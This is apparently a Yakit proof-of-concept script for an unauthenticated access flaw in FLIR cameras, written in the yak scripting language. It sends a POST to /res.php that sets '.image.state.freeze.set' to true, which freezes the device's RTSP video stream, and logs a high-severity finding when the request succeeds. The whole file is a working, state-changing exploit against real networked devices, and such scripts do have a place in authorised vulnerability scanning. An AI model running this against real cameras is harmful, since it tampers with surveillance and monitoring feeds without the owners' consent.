content:
##server:flir
##type:poc
##params:root_url
##name:FLIR_13216_unauth_poc
##severity:high
##out_put:FLIR_13216_Freeze_RTSP_stream_res


yakit.AutoInitYakit()
log.setLevel("info")

poc=func(addr){
    isTls = str.IsTLSServer(addr)
    packet = `POST /res.php HTTP/1.1
Host: {{params(addr)}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36

action=set&resource=.image.state.freeze.set&value=true`

    rsp, req, err = poc.HTTP(packet, poc.https(isTls),poc.params({"addr":addr}))
    if err != nil {
        die(err)
    }    
    http_rsp, err = str.ParseBytesToHTTPResponse(rsp)
    if err != nil {
        die(err)
    }
    if http_rsp.StatusCode<400{
        risk.NewRisk(
            root_url,
            risk.severity("high"), 
            risk.title(f"FOUND ${root_url} 存在FLIR未授权访问漏洞"), 
            risk.titleVerbose("FLIR未授权访问漏洞"), 
            risk.type("身份伪造"), 
            risk.typeVerbose("配置错误"),                 
            risk.request(req), 
            risk.response(rsp), 
            risk.details({"FLIR_13216_Freeze_RTSP_stream_res":true}), 
        )        
    }




}




root_url = cli.String("root_url")
ip, port, err = str.ParseStringToHostPort(root_url)
if err != nil {
    die(err)
}

addr = str.HostPort(ip, port)
poc(addr)
